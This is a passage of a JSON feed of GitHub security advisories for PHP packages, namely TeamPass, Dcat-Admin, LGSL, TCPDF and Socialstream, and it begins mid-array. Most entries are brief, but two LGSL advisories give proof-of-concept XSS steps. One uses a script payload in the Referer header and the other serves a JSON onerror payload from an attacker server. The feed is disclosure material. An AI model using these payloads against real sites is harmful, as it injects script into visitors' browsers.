            "content_html": "<p>TeamPass before 3.1.3.1, when retrieving information about access rights for a folder, does not properly check whether a folder is in a user's allowed folders list that has been defined by an admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-50701\">https://nvd.nist.gov/vuln/detail/CVE-2024-50701</a></li>\n<li><a href=\"https://github.com/nilsteampassnet/TeamPass/commit/ddbb2d3d94085dced50c4936fd2215af88e4a88d\">https://github.com/nilsteampassnet/TeamPass/commit/ddbb2d3d94085dced50c4936fd2215af88e4a88d</a></li>\n<li><a href=\"https://github.com/nilsteampassnet/TeamPass/compare/3.1.2...3.1.3.1\">https://github.com/nilsteampassnet/TeamPass/compare/3.1.2...3.1.3.1</a></li>\n<li><a href=\"https://github.com/nilsteampassnet/TeamPass/compare/3.1.3...3.1.3.1\">https://github.com/nilsteampassnet/TeamPass/compare/3.1.3...3.1.3.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2697-96mv-3gfm\">https://github.com/advisories/GHSA-2697-96mv-3gfm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2697-96mv-3gfm",
            "title": "[nilsteampassnet/teampass] TeamPass does not properly check whether a folder is in a user's allowed folders list",
            "date_modified": "2024-12-30T18:45:28.000Z",
            "date_published": "2024-12-30T15:31:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2697-96mv-3gfm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Dcat-Admin v2.2.0-beta and v2.2.2-beta contains a Cross-Site Scripting (XSS) vulnerability via /admin/auth/menu and /admin/auth/extensions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-54775\">https://nvd.nist.gov/vuln/detail/CVE-2024-54775</a></li>\n<li><a href=\"https://github.com/taynes-llllzt/taynes/issues/5\">https://github.com/taynes-llllzt/taynes/issues/5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-37x3-j9jq-vrjx\">https://github.com/advisories/GHSA-37x3-j9jq-vrjx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-37x3-j9jq-vrjx",
            "title": "[dcat/laravel-admin] Dcat-Admin Cross-Site Scripting (XSS) vulnerability",
            "date_modified": "2024-12-30T16:51:40.000Z",
            "date_published": "2024-12-28T00:30:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-37x3-j9jq-vrjx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Dcat-Admin v2.2.0-beta and v2.2.2-beta contains a Cross-Site Scripting (XSS) vulnerability via /admin/auth/menu and /admin/auth/extensions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-54775\">https://nvd.nist.gov/vuln/detail/CVE-2024-54775</a></li>\n<li><a href=\"https://github.com/taynes-llllzt/taynes/issues/5\">https://github.com/taynes-llllzt/taynes/issues/5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-37x3-j9jq-vrjx\">https://github.com/advisories/GHSA-37x3-j9jq-vrjx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-37x3-j9jq-vrjx",
            "title": "[dcat/laravel-admin] Dcat-Admin Cross-Site Scripting (XSS) vulnerability",
            "date_modified": "2024-12-30T16:51:40.000Z",
            "date_published": "2024-12-28T00:30:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-37x3-j9jq-vrjx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Dcat Admin v2.2.0-beta contains a cross-site scripting (XSS) vulnerability in /admin/articles/create.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-54774\">https://nvd.nist.gov/vuln/detail/CVE-2024-54774</a></li>\n<li><a href=\"https://github.com/taynes-llllzt/taynes/issues/4\">https://github.com/taynes-llllzt/taynes/issues/4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9q34-7hfr-h8jm\">https://github.com/advisories/GHSA-9q34-7hfr-h8jm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9q34-7hfr-h8jm",
            "title": "[dcat/laravel-admin] Dcat Admin Cross-site Scripting (XSS) vulnerability",
            "date_modified": "2024-12-30T16:51:37.000Z",
            "date_published": "2024-12-28T00:30:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9q34-7hfr-h8jm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"reflected-xss-at-lgsl_fileslgsl_listphp\">Reflected XSS at /lgsl_files/lgsl_list.php</h1>\n<p><strong>Description:</strong></p>\n<p>Vulnerability: A reflected XSS vulnerability exists in the <code>Referer</code> HTTP header of <a href=\"https://github.com/tltneon/lgsl/releases/tag/v6.2.1\">LGSL v6.2.1</a>. The vulnerability allows attackers to inject arbitrary JavaScript code, which is reflected in the HTML response without proper sanitization.\nWhen crafted malicious input is provided in the <code>Referer</code> header, it is echoed back into an HTML attribute in the application’s response.</p>\n<p>The vulnerability is present at <a href=\"https://github.com/tltneon/lgsl/blob/master/lgsl_files/lgsl_list.php#L20-L24\">Line 20-24</a></p>\n<pre><code class=\"language-php\">  $uri = $_SERVER['REQUEST_URI'];\n\n  if ($lgsl_config['preloader']) {\n    $uri = $_SERVER['HTTP_REFERER'];\n  }\n</code></pre>\n<p><strong>Proof of Concept:</strong></p>\n<ol>\n<li>Capture a request to the path <code>/lgsl_files/lgsl_list.php</code>.</li>\n<li>Inject the following payload into the Referer header: <code>test'&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;</code>.</li>\n<li>Send the request.</li>\n<li>The XSS payload is triggered when reloading.\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/467a6c60-db45-4520-9918-59dff819b384\">\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/c537c59e-38c2-47f0-97d8-54ee1b2018b8\"></li>\n</ol>\n<p><strong>Impact:</strong></p>\n<p>Execution of Malicious Code</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tltneon/lgsl/security/advisories/GHSA-ggwq-xc72-33r3\">https://github.com/tltneon/lgsl/security/advisories/GHSA-ggwq-xc72-33r3</a></li>\n<li><a href=\"https://github.com/tltneon/lgsl/commit/7ecb839df9358d21f64cdbff5b2536af25a77de1\">https://github.com/tltneon/lgsl/commit/7ecb839df9358d21f64cdbff5b2536af25a77de1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56517\">https://nvd.nist.gov/vuln/detail/CVE-2024-56517</a></li>\n<li><a href=\"https://github.com/tltneon/lgsl/blob/master/lgsl_files/lgsl_list.php#L20-L24\">https://github.com/tltneon/lgsl/blob/master/lgsl_files/lgsl_list.php#L20-L24</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ggwq-xc72-33r3\">https://github.com/advisories/GHSA-ggwq-xc72-33r3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ggwq-xc72-33r3",
            "title": "[tltneon/lgsl] LGSL has a reflected XSS at /lgsl_files/lgsl_list.php",
            "date_modified": "2024-12-30T18:45:00.000Z",
            "date_published": "2024-12-30T16:49:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ggwq-xc72-33r3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in TCPDF before 6.8.0. The Error function lacks an htmlspecialchars call for the error message.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56527\">https://nvd.nist.gov/vuln/detail/CVE-2024-56527</a></li>\n<li><a href=\"https://github.com/tecnickcom/TCPDF/commit/11778aaa2d9e30a9ae1c1ee97ff349344f0ad6e1\">https://github.com/tecnickcom/TCPDF/commit/11778aaa2d9e30a9ae1c1ee97ff349344f0ad6e1</a></li>\n<li><a href=\"https://github.com/tecnickcom/TCPDF/compare/6.7.8...6.8.0\">https://github.com/tecnickcom/TCPDF/compare/6.7.8...6.8.0</a></li>\n<li><a href=\"https://tcpdf.org\">https://tcpdf.org</a></li>\n<li><a href=\"https://andrea0.medium.com/analysis-of-cve-2024-56527-dbdab6962add\">https://andrea0.medium.com/analysis-of-cve-2024-56527-dbdab6962add</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qx95-cwh6-9mvq\">https://github.com/advisories/GHSA-qx95-cwh6-9mvq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qx95-cwh6-9mvq",
            "title": "[tecnickcom/tcpdf] TCPDF missing character escape on error messages",
            "date_modified": "2024-12-27T21:07:39.000Z",
            "date_published": "2024-12-27T06:30:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qx95-cwh6-9mvq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in TCPDF before 6.8.0. unserializeTCPDFtag uses != (aka loose comparison) and does not use a constant-time function to compare TCPDF tag hashes.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56522\">https://nvd.nist.gov/vuln/detail/CVE-2024-56522</a></li>\n<li><a href=\"https://github.com/tecnickcom/TCPDF/commit/d54b97cec33f4f1a5ad81119a82085cad93cec89\">https://github.com/tecnickcom/TCPDF/commit/d54b97cec33f4f1a5ad81119a82085cad93cec89</a></li>\n<li><a href=\"https://github.com/tecnickcom/TCPDF/compare/6.7.8...6.8.0\">https://github.com/tecnickcom/TCPDF/compare/6.7.8...6.8.0</a></li>\n<li><a href=\"https://tcpdf.org\">https://tcpdf.org</a></li>\n<li><a href=\"https://www.php.net/manual/en/types.comparisons.php\">https://www.php.net/manual/en/types.comparisons.php</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w95c-7994-ghpr\">https://github.com/advisories/GHSA-w95c-7994-ghpr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w95c-7994-ghpr",
            "title": "[tecnickcom/tcpdf] TCPDF has incorrect comparison",
            "date_modified": "2024-12-30T18:44:45.000Z",
            "date_published": "2024-12-27T06:30:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w95c-7994-ghpr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in TCPDF before 6.8.0. If libcurl is used, CURLOPT_SSL_VERIFYHOST and CURLOPT_SSL_VERIFYPEER are set unsafely.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56521\">https://nvd.nist.gov/vuln/detail/CVE-2024-56521</a></li>\n<li><a href=\"https://github.com/tecnickcom/TCPDF/commit/aab43ab0a824e956276141a28a24c7c0be20f554\">https://github.com/tecnickcom/TCPDF/commit/aab43ab0a824e956276141a28a24c7c0be20f554</a></li>\n<li><a href=\"https://github.com/tecnickcom/TCPDF/compare/6.7.8...6.8.0\">https://github.com/tecnickcom/TCPDF/compare/6.7.8...6.8.0</a></li>\n<li><a href=\"https://tcpdf.org\">https://tcpdf.org</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9mgx-552f-59p6\">https://github.com/advisories/GHSA-9mgx-552f-59p6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9mgx-552f-59p6",
            "title": "[tecnickcom/tcpdf] TCPDF missing certificate validation",
            "date_modified": "2024-12-27T19:54:50.000Z",
            "date_published": "2024-12-27T06:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9mgx-552f-59p6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in tc-lib-pdf-font before 2.6.4, as used in TCPDF before 6.8.0 and other products. Fonts are mishandled, e.g., FontBBox for Type 1 and TrueType fonts is misparsed.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56520\">https://nvd.nist.gov/vuln/detail/CVE-2024-56520</a></li>\n<li><a href=\"https://github.com/tecnickcom/TCPDF/commit/a0a02efe487cc39bd5223359e916dbeafb5cd6fe\">https://github.com/tecnickcom/TCPDF/commit/a0a02efe487cc39bd5223359e916dbeafb5cd6fe</a></li>\n<li><a href=\"https://github.com/tecnickcom/tc-lib-pdf-font/commit/30012e333ae611c514ec2dc7cb370bbf4da4e677\">https://github.com/tecnickcom/tc-lib-pdf-font/commit/30012e333ae611c514ec2dc7cb370bbf4da4e677</a></li>\n<li><a href=\"https://github.com/tecnickcom/TCPDF/compare/6.7.8...6.8.0\">https://github.com/tecnickcom/TCPDF/compare/6.7.8...6.8.0</a></li>\n<li><a href=\"https://github.com/tecnickcom/tc-lib-pdf-font/compare/2.6.2...2.6.4\">https://github.com/tecnickcom/tc-lib-pdf-font/compare/2.6.2...2.6.4</a></li>\n<li><a href=\"https://tcpdf.org\">https://tcpdf.org</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-grhh-r4jj-8jh7\">https://github.com/advisories/GHSA-grhh-r4jj-8jh7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-grhh-r4jj-8jh7",
            "title": "[tecnickcom/tc-lib-pdf-font] tecnickcom/tc-lib-pdf-font mishandles fonts",
            "date_modified": "2024-12-27T19:53:22.000Z",
            "date_published": "2024-12-27T06:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-grhh-r4jj-8jh7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in TCPDF before 6.8.0. setSVGStyles does not sanitize the SVG font-family attribute.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56519\">https://nvd.nist.gov/vuln/detail/CVE-2024-56519</a></li>\n<li><a href=\"https://github.com/tecnickcom/TCPDF/commit/c9f41cbb84880bdb4fc3e0a9d287214d1ac4d7f4\">https://github.com/tecnickcom/TCPDF/commit/c9f41cbb84880bdb4fc3e0a9d287214d1ac4d7f4</a></li>\n<li><a href=\"https://github.com/tecnickcom/TCPDF/compare/6.7.8...6.8.0\">https://github.com/tecnickcom/TCPDF/compare/6.7.8...6.8.0</a></li>\n<li><a href=\"https://tcpdf.org\">https://tcpdf.org</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4p8j-vhjm-6pvw\">https://github.com/advisories/GHSA-4p8j-vhjm-6pvw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4p8j-vhjm-6pvw",
            "title": "[tecnickcom/tcpdf] TCPDF lacks SVG sanitization",
            "date_modified": "2024-12-27T19:52:40.000Z",
            "date_published": "2024-12-27T06:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4p8j-vhjm-6pvw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A stored cross-site scripting (XSS) vulnerability was identified in lgsl. The issue arises from improper sanitation of user input. Everyone who accesses this page will be affected by this attack.</p>\n<h3 id=\"details\">Details</h3>\n<p>The function <code>lgsl_query_40</code> in <code>lgsl_protocol.php</code> has implemented an HTTP crawler. This function makes a request to the registered game server, and upon crawling the malicious <code>/info</code> endpoint with our payload, will render our javascript on the info page. This information is being displayed via <code>lgsl_details.php</code></p>\n<h4 id=\"affected-code\">Affected Code:</h4>\n<pre><code class=\"language-php\">      foreach ($server['e'] as $field =&gt; $value) {\n        $value = preg_replace('/((https*:\\/\\/|https*:\\/\\/www\\.|www\\.)[\\w\\d\\.\\-\\/=$?​]*)/i', \"&lt;a href='$1' target='_blank'&gt;$1&lt;/a&gt;\", html_entity_decode($value));\n        $output .= \"\n        &lt;tr&gt;&lt;td&gt; {$field} &lt;/td&gt;&lt;td&gt; {$value} &lt;/td&gt;&lt;/tr&gt;\";\n      }\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li><p>Create a game server with type <code>eco</code> and set the target host and port accordingly to your ttack server. I have crafted this json payload that is being parsed according to the schema and being served on <code>/info</code> </p>\n</li>\n<li><p>Serve the following JSON payload at <code>/info</code> on your handler</p>\n</li>\n</ol>\n<pre><code class=\"language-json\">{\n  \"Animals\": \"1\",\n  \"EconomyDesc\": \"&lt;img src=x onerror=prompt(1)&gt;\"\n}\n</code></pre>\n<ol start=\"3\">\n<li>Access the corresponding server info page at <code>/s?=</code>. Upon refreshing &amp; crawling our server, it should execute our javascript.</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tltneon/lgsl/security/advisories/GHSA-xx95-62h6-h7v3\">https://github.com/tltneon/lgsl/security/advisories/GHSA-xx95-62h6-h7v3</a></li>\n<li><a href=\"https://github.com/tltneon/lgsl/commit/3fbd3bb581b636f7fd3ea0592c5f8df87d3a2843\">https://github.com/tltneon/lgsl/commit/3fbd3bb581b636f7fd3ea0592c5f8df87d3a2843</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xx95-62h6-h7v3\">https://github.com/advisories/GHSA-xx95-62h6-h7v3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xx95-62h6-h7v3",
            "title": "[tltneon/lgsl] lgsl Stored Cross-Site Scripting vulnerability",
            "date_modified": "2024-12-27T00:32:07.000Z",
            "date_published": "2024-12-26T20:20:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xx95-62h6-h7v3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"description\">Description</h2>\n<p>When linking a social account to an already authenticated user, the lack of a confirmation step introduces a security risk. This is exacerbated if -&gt;stateless() is used in the Socialite configuration, bypassing state verification and making the exploit easier. Developers should ensure that users explicitly confirm account linking and avoid configurations that skip critical security checks.</p>\n<h2 id=\"resolution\">Resolution</h2>\n<p>Socialstream v6.2 introduces a new custom route that requires a user to \"Confirm\" or \"Deny\" a request to link a social account.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/joelbutcher/socialstream/security/advisories/GHSA-3q97-vjpp-c8rp\">https://github.com/joelbutcher/socialstream/security/advisories/GHSA-3q97-vjpp-c8rp</a></li>\n<li><a href=\"https://github.com/joelbutcher/socialstream/commit/ae4dc3906f54fa792b296036d7b3dcea9a4d259b\">https://github.com/joelbutcher/socialstream/commit/ae4dc3906f54fa792b296036d7b3dcea9a4d259b</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56329\">https://nvd.nist.gov/vuln/detail/CVE-2024-56329</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3q97-vjpp-c8rp\">https://github.com/advisories/GHSA-3q97-vjpp-c8rp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3q97-vjpp-c8rp",
            "title": "[joelbutcher/socialstream] Socialstream has a Potential Account Takeover Vulnerability in Social Account Linking Due to Missing User Consent After OAuth Callback",
            "date_modified": "2024-12-26T17:28:33.000Z",
            "date_published": "2024-12-20T15:01:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3q97-vjpp-c8rp"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}